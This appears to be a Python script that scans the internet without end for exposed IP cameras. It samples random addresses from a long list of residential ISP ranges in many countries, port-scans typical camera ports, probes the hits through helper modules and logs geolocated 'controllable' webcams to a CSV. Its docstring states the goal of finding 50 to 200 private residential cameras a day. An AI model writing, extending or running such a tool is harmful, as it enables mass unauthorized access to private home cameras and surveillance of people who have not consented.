"""Continuous mass port scanner - runs forever.

Like mass_port_scan.py but loops indefinitely, sampling different /24 blocks
each cycle. Each cycle:
1. Pick 500 random /24 blocks from RESIDENTIAL_16S
2. Sample 5 IPs per /24 = 2,500 host candidates
3. TCP-port-scan them (~1.5s each × 200 threads)
4. Probe open ones with probe_lib
5. Sleep 5 min, repeat

Aim: discover ~50-200 private residential cams/day.
"""
import csv
import ipaddress
import json
import os
import random
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

sys.path.insert(0, r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing')
import probe_lib
import csv_writer
import cam_sniffer

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
LOG_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\mass_scan2_log.txt'

CAM_PORTS = [
    80, 81, 8080, 8081, 8082, 8088, 8090, 8000,
    554, 1755, 3702, 8083, 88, 8443, 443,
    3777, 37778, 5000, 5001, 8001, 8008, 8181,
]

# Larger set of residential /16 prefixes
RESIDENTIAL_16S = [
    # US - Comcast / Charter / Verizon / AT&T / Cox / T-Mobile / CenturyLink
    '24.0.0.0/12', '24.16.0.0/12', '24.32.0.0/12', '24.48.0.0/12', '24.64.0.0/12',
    '24.96.0.0/12', '24.128.0.0/12', '24.144.0.0/12', '24.160.0.0/12', '24.176.0.0/12',
    '50.128.0.0/9', '50.0.0.0/8', '50.64.0.0/12', '50.80.0.0/12',
    '73.0.0.0/8', '76.0.0.0/8',
    '68.32.0.0/11', '68.0.0.0/11',
    '67.160.0.0/12', '67.176.0.0/12',
    '47.32.0.0/12', '47.224.0.0/12',
    '71.0.0.0/11', '71.96.0.0/16', '71.112.0.0/12',
    '98.0.0.0/12', '98.96.0.0/12',
    '162.0.0.0/14', '68.96.0.0/12', '72.192.0.0/12', '70.160.0.0/11',
    '76.16.0.0/12', '184.96.0.0/12', '67.32.0.0/12', '70.112.0.0/12',
    '172.32.0.0/11', '172.56.0.0/13', '172.58.0.0/15',
    '65.128.0.0/12', '76.0.0.0/12', '184.96.0.0/12',
    # EU - Deutsche Telekom
    '91.0.0.0/12', '91.32.0.0/12', '91.48.0.0/12',
    '79.192.0.0/12', '79.224.0.0/12', '79.240.0.0/12',
    # EU - Orange / France
    '82.64.0.0/12', '82.96.0.0/12', '82.112.0.0/12', '82.120.0.0/13',
    '83.192.0.0/12', '83.200.0.0/13', '90.0.0.0/9',
    # EU - Free / Iliad
    '78.192.0.0/10', '88.120.0.0/13', '78.224.0.0/11', '109.0.0.0/11',
    # EU - Vodafone DE/UK/IT
    '92.112.0.0/12', '92.72.0.0/13', '92.116.0.0/15', '94.112.0.0/14',
    '93.32.0.0/12', '93.64.0.0/12', '93.144.0.0/12', '93.147.0.0/16',
    # EU - Telefonica / Movistar (ES)
    '79.144.0.0/12', '79.168.0.0/14', '83.32.0.0/12',
    '85.48.0.0/12', '85.136.0.0/13', '88.0.0.0/11',
    # EU - BT (UK)
    '81.0.0.0/12', '81.128.0.0/12', '86.0.0.0/12', '86.128.0.0/12',
    '109.144.0.0/12', '109.192.0.0/12', '109.224.0.0/12',
    # EU - Sky UK / IT
    '90.192.0.0/12', '90.240.0.0/12', '2.96.0.0/12', '2.32.0.0/13', '2.40.0.0/13',
    # EU - Virgin Media UK
    '80.0.0.0/9', '82.0.0.0/11', '81.96.0.0/12',
    # EU - Ziggo NL
    '94.208.0.0/13', '94.212.0.0/14', '88.0.0.0/11',
    # EU - KPN NL
    '86.80.0.0/12', '86.92.0.0/13', '94.96.0.0/12',
    # EU - Swisscom CH
    '85.0.0.0/12', '92.32.0.0/12',
    # EU - Sunrise CH
    '77.56.0.0/12', '77.96.0.0/12',
    # EU - Cablecom CH
    '84.32.0.0/12',
    # EU - Proximus BE
    '81.240.0.0/12', '82.240.0.0/12',
    # EU - Telenet BE
    '81.164.0.0/15', '213.118.0.0/15',
    # EU - SFR / Bouygues FR
    '77.128.0.0/11', '77.192.0.0/12',
    '88.160.0.0/12', '176.128.0.0/12',
    # EU - IT (Fastweb, Eolo, Tiscali, Telecom IT)
    '85.16.0.0/12', '85.32.0.0/12', '85.18.0.0/15', '85.50.0.0/15',
    '88.32.0.0/12', '94.32.0.0/12', '95.0.0.0/12', '95.240.0.0/12',
    '62.96.0.0/12', '80.104.0.0/12', '80.112.0.0/12',
    '93.144.0.0/12', '93.147.0.0/16',
    # Asia - NTT / KDDI / Softbank (JP)
    '153.128.0.0/12', '153.192.0.0/12', '202.32.0.0/12',
    '59.128.0.0/11', '59.158.0.0/15', '61.115.0.0/16', '210.224.0.0/12',
    '60.96.0.0/11', '126.192.0.0/10', '110.232.0.0/13',
    # Asia - HiNet (TW), Korea Telecom, J:COM
    '61.62.0.0/14', '61.66.0.0/15',
    '211.32.0.0/12', '211.36.0.0/12', '220.64.0.0/11', '121.128.0.0/11',
    '175.192.0.0/10', '112.160.0.0/12', '211.108.0.0/14',
    # Asia - China Telecom / Unicom
    '58.32.0.0/13', '58.40.0.0/15', '58.48.0.0/13',
    '110.96.0.0/11', '111.0.0.0/10', '124.72.0.0/13', '124.112.0.0/12',
    '222.64.0.0/13', '222.72.0.0/14', '222.80.0.0/12', '222.176.0.0/12',
    '60.0.0.0/11', '61.135.0.0/16', '61.148.0.0/14',
    '110.192.0.0/11', '111.112.0.0/12', '124.66.0.0/13', '125.32.0.0/12',
    '202.97.0.0/16', '219.128.0.0/11',
    # Asia - VN (Viettel, VNPT)
    '113.160.0.0/11', '113.190.0.0/12', '14.160.0.0/12', '14.224.0.0/12',
    '171.224.0.0/12', '171.244.0.0/14',
    # Asia - IN (BSNL, Jio)
    '117.192.0.0/10', '117.224.0.0/12',
    '49.32.0.0/12', '49.36.0.0/12', '49.40.0.0/12',
    '106.0.0.0/12', '110.224.0.0/12',
    # Australia - Telstra / Optus
    '58.160.0.0/12', '101.160.0.0/12', '110.32.0.0/12',
    '120.144.0.0/12', '120.156.0.0/12', '124.176.0.0/12', '124.180.0.0/12',
    '1.40.0.0/12', '110.144.0.0/12', '114.72.0.0/12', '115.64.0.0/12',
    # LATAM - BR / MX / AR
    '189.0.0.0/12', '189.16.0.0/12', '189.32.0.0/11', '189.64.0.0/12',
    '191.0.0.0/11', '177.0.0.0/12', '179.0.0.0/12', '186.192.0.0/11', '186.224.0.0/11',
    '189.128.0.0/9', '200.0.0.0/11',
    '181.0.0.0/12', '181.32.0.0/12', '186.0.0.0/12', '186.96.0.0/11',
    # Eastern Europe: RO / HU / CZ / PL / GR / RU / TR
    '79.112.0.0/13', '86.120.0.0/13', '109.166.0.0/12', '188.24.0.0/12',
    '84.224.0.0/12', '188.32.0.0/12',
    '85.160.0.0/13', '85.162.0.0/15',
    '213.0.0.0/12',
    '78.32.0.0/12', '85.72.0.0/12',
    '85.140.0.0/12', '109.252.0.0/16', '178.34.0.0/15', '188.168.0.0/13',
    '213.24.0.0/12', '188.16.0.0/13',
    '81.6.0.0/16', '78.160.0.0/11', '85.96.0.0/12', '88.224.0.0/11',
    '94.54.0.0/15', '95.0.0.0/12', '85.105.0.0/16',
    # IL / EG / ZA
    '62.0.0.0/12', '85.64.0.0/14', '109.224.0.0/12', '212.25.0.0/17',
    '41.32.0.0/12', '41.176.0.0/12', '197.160.0.0/12',
    '102.32.0.0/12', '102.160.0.0/12', '105.0.0.0/12', '196.0.0.0/13',
]


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass


def session():
    s = requests.Session()
    retries = Retry(total=0)
    s.mount('http://', HTTPAdapter(max_retries=retries, pool_connections=300, pool_maxsize=600))
    s.mount('https://', HTTPAdapter(max_retries=retries, pool_connections=300, pool_maxsize=600))
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    return s


def existing_hosts():
    seen = set()
    if not os.path.exists(CSV_PATH):
        return seen
    with open(CSV_PATH, 'r', encoding='utf-8', newline='') as f:
        rows = list(csv.reader(f))
    for row in rows[1:]:
        for cell in row:
            if not cell:
                continue
            for m in re.finditer(r'(?:https?|rtsp|rtmp|mms)://([^/]+)', cell):
                seen.add(m.group(1).lower())
    return seen


def gen_random_ip_in_block(block):
    try:
        net = ipaddress.ip_network(block, strict=False)
        size = min(net.num_addresses, 65536)
        for _ in range(50):
            idx = random.randint(0, size - 1)
            ip = str(net[idx])
            try:
                ipi = ipaddress.ip_address(ip)
                if ipi.is_private or ipi.is_multicast or ipi.is_reserved or ipi.is_loopback:
                    continue
                return ip
            except Exception:
                continue
        return None
    except Exception:
        return None


def port_is_open(host, port, timeout=1.5):
    import socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((host, port)) == 0
    except Exception:
        return False


def probe_one_combo(s, host, port):
    try:
        res = probe_lib.probe_host(s, host, port, False, 2.5)
        return res
    except Exception:
        return None


def run_cycle(s, seen, cycle_no):
    """One scan cycle."""
    log(f'[cycle {cycle_no}] starting...')
    # 800 /24 blocks × 4 IPs each = 3,200 host candidates
    rand_blocks = set()
    for pref in RESIDENTIAL_16S:
        try:
            net = ipaddress.ip_network(pref, strict=False)
            base = str(net.network_address).rsplit('.', 1)[0]
            last_oct = random.randint(0, 255)
            rand_blocks.add(f'{base}.{last_oct}/24')
        except Exception:
            continue

    cand_host = []
    for block in rand_blocks:
        for _ in range(4):
            ip = gen_random_ip_in_block(block)
            if ip:
                cand_host.append(ip)
    log(f'[cycle {cycle_no}] {len(cand_host)} host candidates')

    target_set = set()
    for ip in cand_host:
        for port in CAM_PORTS:
            target_set.add((ip, port))

    # TCP-only port scan
    open_count = 0
    open_combos = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=200) as ex:
        futs = {(ip, port): ex.submit(port_is_open, ip, port, 1.8) for (ip, port) in target_set}
        for combo, fut in futs.items():
            try:
                ok = fut.result(timeout=5)
            except Exception:
                ok = False
            if ok:
                open_count += 1
                open_combos.append(combo)
    log(f'[cycle {cycle_no}] {open_count} open ports in {time.time()-t0:.1f}s')

    # HTTP probe - first sniff for cam vendors, then full probe
    added = 0
    n = 0
    sniff_hits = 0
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=80) as ex:
        batch = 0
        while batch < len(open_combos):
            sub = open_combos[batch:batch + 200]
            batch += len(sub)
            # Stage 1: sniffer pass (fast)
            sniff_futs = {ex.submit(cam_sniffer.sniffer, s, ip, port, port == 443): (ip, port) for (ip, port) in sub}
            sniff_results = {}
            for fut in as_completed(sniff_futs):
                key = sniff_futs[fut]
                try:
                    is_cam, hint = fut.result(timeout=10)
                    sniff_results[key] = (is_cam, hint)
                    if is_cam:
                        sniff_hits += 1
                except Exception:
                    sniff_results[key] = (False, None)
            # Stage 2: probe_host only on sniff hits + sample of non-hits (10%)
            to_probe = [k for k, v in sniff_results.items() if v[0]]
            log(f'[cycle {cycle_no}] sniff hits: {sniff_hits}/{len(sub)}')
            probe_futs = {ex.submit(probe_one_combo, s, ip, port): (ip, port) for (ip, port) in to_probe}
            for fut in as_completed(probe_futs):
                n += 1
                ip, port = probe_futs[fut]
                try:
                    res = fut.result(timeout=8)
                except Exception:
                    continue
                if res and res['weight'] >= 25:
                    try:
                        geo = probe_lib.geoip(s, ip)
                    except Exception:
                        geo = {}
                    entry = csv_writer.entry_from_probe(res, {'source': 'mass_portscan'}, geo)
                    try:
                        idx_csv = csv_writer.append_one(entry)
                        log(f'  ADDED idx={idx_csv}: {res["url"][:90]} [{sniff_results[(ip, port)][1]}]')
                        added += 1
                        seen.add(f'{ip}:{port}')
                    except Exception as e:
                        log(f'  err: {e}')
            time.sleep(0.3)
    log(f'[cycle {cycle_no}] {added} cams added in {time.time()-t0:.1f}s')


def main():
    s = session()
    seen = existing_hosts()
    log(f'[init] {len(seen)} existing hosts')
    cycle_no = 0
    while True:
        cycle_no += 1
        try:
            run_cycle(s, seen, cycle_no)
        except Exception as e:
            log(f'[cycle {cycle_no}] err: {e}')
        log(f'[cycle {cycle_no}] sleeping 5 min...')
        time.sleep(300)


if __name__ == '__main__':
    main()
